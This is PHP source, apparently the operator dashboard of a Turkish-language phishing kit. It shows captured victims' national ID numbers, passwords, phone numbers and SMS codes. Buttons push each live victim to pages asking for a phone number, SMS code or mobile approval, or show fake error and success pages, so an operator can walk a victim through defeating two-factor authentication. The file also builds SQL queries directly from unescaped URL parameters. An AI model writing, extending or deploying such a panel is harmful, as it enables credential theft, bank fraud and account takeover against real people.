<?php
require "core.php";
head();
date_default_timezone_set('Europe/Istanbul');

$ip = $_SERVER['REMOTE_ADDR'];

$Zaman = date('H:i');

$ip = $_SERVER['REMOTE_ADDR'];
$tarih = date('d.m.Y H:i');

if (isset($_GET['getphonecode'])) {
    $ip = $_GET['getphonecode'];
    $id = $_GET['id'];
    $page = "Telefon Sayfası";
    $mysqli->query("UPDATE users SET page = '$page' WHERE ip = '$ip' AND id = $id");
    echo "<script>window.location.href='logs.php';</script>";
}

if (isset($_GET['getsms'])) {
    $ip = $_GET['getsms'];
    $id = $_GET['id'];
    $page = "SMS Sayfası";
    $mysqli->query("UPDATE users SET page = '$page' WHERE ip = '$ip' AND id = $id");
    echo "<script>window.location.href='logs.php';</script>";
}

if (isset($_GET['getbildirim'])) {
    $ip = $_GET['getbildirim'];
    $id = $_GET['id'];
    $page = "Bildirim Sayfası";
    $mysqli->query("UPDATE users SET page = '$page' WHERE ip = '$ip' AND id = $id");
    echo "<script>window.location.href='logs.php';</script>";
}

if (isset($_GET['getphonefe'])) {
    $ip = $_GET['getphonefe'];
    $id = $_GET['id'];
    $page = "Hatalı SMS";
    $mysqli->query("UPDATE users SET page = '$page' WHERE ip = '$ip' AND id = $id");
    echo "<script>window.location.href='logs.php';</script>";
}

if (isset($_GET['getloginfe'])) {
    $ip = $_GET['getloginfe'];
    $id = $_GET['id'];
    $page = "Hatalı Bilgi";
    $mysqli->query("UPDATE users SET page = '$page' WHERE ip = '$ip' AND id = $id");
    echo "<script>window.location.href='logs.php';</script>";
}

if (isset($_GET['getok'])) {
    $ip = $_GET['getok'];
    $id = $_GET['id'];
    $page = "Tebrikle";
    $mysqli->query("UPDATE users SET page = '$page' WHERE ip = '$ip' AND id = $id");
    echo "<script>window.location.href='logs.php';</script>";
}

if (isset($_GET['sil']) && isset($_GET['id'])) {
    $sil = $mysqli->real_escape_string($_GET['sil']);
    $id = $mysqli->real_escape_string($_GET['id']);

    $sql = "DELETE FROM users WHERE ip='$sil' AND id='$id'";

    if ($mysqli->query($sql) === true) {
        echo "
            <script>
                Swal.fire({
                    icon: 'success',
                    title: 'Başarılı',
                    text: 'Kayıt başarıyla silindi.',
                    confirmButtonText: 'Tamam'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = 'logs.php';
                    }
                });
            </script>
            ";
    }
}

if (isset($_GET['delete-all'])) {
    $sql = "TRUNCATE TABLE users";

    if ($mysqli->query($sql) === true) {
        echo "
            <script>
                Swal.fire({
                    icon: 'success',
                    title: 'Başarılı', 
                    text: 'Tüm kayıtlar başarıyla silindi.',
                    confirmButtonText: 'Tamam'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = 'logs.php';
                    }
                });
            </script>
            ";
    }
}

if (isset($_GET['ban'])) {
    $ban = $_GET['ban'];
    $ip = $ban;
    $date = date("d F Y");
    $time = date("H:i");
    $redirect = '1';
    $url = 'https://www.youtube.com/watch?v=1QLie0vnwPs';
    echo "<script>window.location.href='logs.php';</script>";
    $queryvalid = $mysqli->query("SELECT * FROM `psec_bans` WHERE ip='$ip' LIMIT 1");
    $validator = mysqli_num_rows($queryvalid);
    if ($validator > "0") {
        echo '<br />
		<div class="callout callout-info">
                <p><i class="fas fa-info-circle"></i> This <strong>IP Address</strong> is already banned.</p>
        </div>';
    } else {
        $query = $mysqli->query("INSERT INTO `psec_bans` (`ip`, `date`, `time`, `reason`, `redirect`, `url`) VALUES ('$ip', '$date', '$time', '$reason', '$redirect', '$url')");
    }
}
if (isset($_GET['dondur'])) {
    $dondur = $_GET['dondur'];
    $mysqli->query("INSERT INTO back (back) VALUES ('$dondur')");
    echo "<script>alert('Kullanıcı Sayfanın başına gönderildi!');</script>";
    echo "<script>window.location.href='logs.php';</script>";
}
if (isset($_GET['go'])) {
    $go = $_GET['go'];
    $go_ip = $_GET['go_ip'];
    $mysqli->query("UPDATE users SET go = '{$go}' WHERE ip = '{$go_ip}'");
    echo "<script>alert('Kullanıcı belirttiğiniz sayfaya yönlendirildi!');</script>";
    echo "<script>window.location.href='logs.php';</script>";
}
if (isset($_GET['logout'])) {
    $giren = $_SERVER['REMOTE_ADDR'];
    $mysqli->query("DELETE FROM paneldekiler WHERE ip='$giren'");
    session_start();
    ob_start();
    session_unset();
    session_destroy();
    header('Location: login.php');
}

?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>

<div class="content-wrapper" style="margin-top: 0px!important;background-color: #1b1d1e;">
    <style>
        @import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

        tbody tr td {
            font-family: Montserrat;
            font-weight: 700;
            font-style: normal;


        }

        th.min-w-50px.sorting {
            text-align: center
        }

        tbody tr td {
            text-align: center;
        }

        h3.card-title {
            font-weight: 700;
            font-style: normal;
            font-size: 24px
        }

        @import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

        span.navbar-text.ml-auto {
            margin-right: 70px;
            font-weight: 700;
            font-style: normal;
            font-family: Montserrat;
            font-size: 16px;
        }

        div.swal2-popup.swal2-modal.swal2-show {
            width: 555px;
        }
    </style>
    <div class="card card-primary card-outline">
        <div class="card-header">
            <h3 class="card-title">LOGLAR</h3>
            <div class="float-sm-right">

                <span class="navbar-text ml-auto" id="online-status">
                    Online: 0 🟢
                </span>


                <button id="exportButton" class="btn btn-success">EXCEL KAYDET</button> <a href="?delete-all" class="btn btn-danger"><i class="fas fa-trash"></i> Tümünü Sil</a>
            </div>
        </div>
        <div class="card-body">
            <script>
                document.addEventListener('DOMContentLoaded', function() {
                    $(document).on('click', '.sweetalert-button', function(event) {
                        event.preventDefault();


                        const ip = $(this).data('ip');
                        const id = $(this).data('id');
                        Swal.fire({
                            title: 'İşlem Seçimi',
                            html: `
                                <div style="text-align: center; text-transform: uppercase;">
                                    <a href="?getphonecode=${ip}&id=${id}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #1976d2; background-color: #e3f2fd; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-phone" style="margin-right: 8px;"></i>
                                        Telefon Numarası Al
                                    </a>
                                    <a href="?getsms=${ip}&id=${id}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #c62828; background-color: #ffcdd2; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-message" style="margin-right: 8px;"></i>
                                        SMS Al
                                    </a>
                                    <a href="?getbildirim=${ip}&id=${id}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #388e3c; background-color: #f1f8e9; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-mobile" style="margin-right: 8px;"></i>
                                        Mobil Onay Al
                                    </a>
                                    <a href="?getphonefe=${ip}&id=${id}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #f57c00; background-color: #fff3e0; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-triangle-exclamation" style="margin-right: 8px;"></i>
                                        Hatalı SMS
                                    </a>
                                    <a href="?getloginfe=${ip}&id=${id}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #2e7d32; background-color: #e8f5e9; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-xmark" style="margin-right: 8px;"></i>
                                        Hatalı Giriş Bilgisi
                                    </a>
                                    <a href="?getok=${ip}&id=${id}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #d32f2f; background-color: #ffebee; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-check" style="margin-right: 8px;"></i>Tebrikle
                                    </a>
                                    <a href="?ban=${ip}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #607d8b; background-color: #eceff1; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-ban" style="margin-right: 8px;"></i>Ban
                                    </a>
                                    <a href="?sil=${ip}&id=${id}" class="swal2-link" style="font-size: 14px; display: block; margin-bottom: 10px; color: #f9a825; background-color: #fffde7; padding: 10px; border-radius: 5px;">
                                        <i class="fa-solid fa-trash" style="margin-right: 8px;"></i>Sil
                                    </a>
                                </div>
                            `,
                            showConfirmButton: false,
                            width: '300px',
                            padding: '1em',
                            position: 'top-end',
                            backdrop: false,
                            didOpen: () => {
                                document.addEventListener('click', function handleClickOutside(event) {
                                    if (!Swal.getPopup().contains(event.target)) {
                                        Swal.close();
                                        document.removeEventListener('click', handleClickOutside);
                                    }
                                });
                            }
                        });
                    });

                    function fetchLogs() {
                        $.ajax({
                            url: 'fetch_logs.php',
                            type: 'GET',
                            success: function(data) {
                                $('#logsTableBody').html(data);
                            }
                        });
                    }

                    fetchLogs();
                    setInterval(fetchLogs, 2400);
                });
            </script>
            <div class="table-responsive">
                <table class="table table-sm table-bordered table-hover" width="100%" id="downtable">

                    <thead class="<?php echo $thead; ?>">
                        <th class="min-w-50px sorting">ID</th>
                        <th class="min-w-50px sorting" style="max-width: 40px;">TARİH</th>
                        <th class="min-w-50px sorting">TC NO</th>
                        <th class="min-w-50px sorting">PASS</th>
                        <th class="min-w-50px sorting">TEL NO</th>
                        <th class="min-w-50px sorting">SMS</th>
                        <th class="min-w-50px sorting">IP (
                            <?php
                            $onlineList = [];
                            $query = $mysqli->query("SELECT * FROM users");
                            if ($query->num_rows > 0) {
                                while ($v = $query->fetch_assoc()) {
                                    if ($v['last_activity'] > time()) {
                                        array_push($onlineList, $v['ip']);
                                    }
                                }
                            }
                            echo count($onlineList);
                            ?>
                            )
                        </th>
                        <th class="min-w-50px sorting" style="max-width: 70px;">DURUM</th>
                        <th class="text-end min-w-100px sorting_disabled" style="max-width: 70px;">İŞLEM</th>
                        </tr>
                    </thead>
                    <tbody id="logsTableBody" class="text-gray-600 fw-semibold">

                    </tbody>
                </table>
            </div>
        </div>

    </div>
</div>
</div>
</div>
<!--===================================================-->
<!--End page content-->
<script>
    function updateOnlineStatus() {
        $.ajax({
            url: './online.php', 
            method: 'GET',
            dataType: 'json',
            success: function(data) {
                $('#online-status').text(' Online:  ' + data.onlineCount + ' 🟢 | Toplam Tıklama: ' + data.totalCount);
                if (data.notification) {
                    const audio = new Audio('./assets/notification.mp3');
                    audio.play();
                }
            }
        });
    }

    $(document).ready(function() {
        updateOnlineStatus();
        setInterval(updateOnlineStatus, 2500);
    });
</script>


<script>
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('exportButton').addEventListener('click', function() {
                var table = document.getElementById('downtable');
                if (table) {
                    var wb = XLSX.utils.table_to_book(table, {
                        sheet: "Sheet JS"
                    });
                    XLSX.writeFile(wb, 'table_data.xlsx');
                } else {
                    console.error("Tablo bulunamadı!");
                }
            });
        });
    </script>
</div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

</div>
<?php
footer();
$mysqli->close();
?>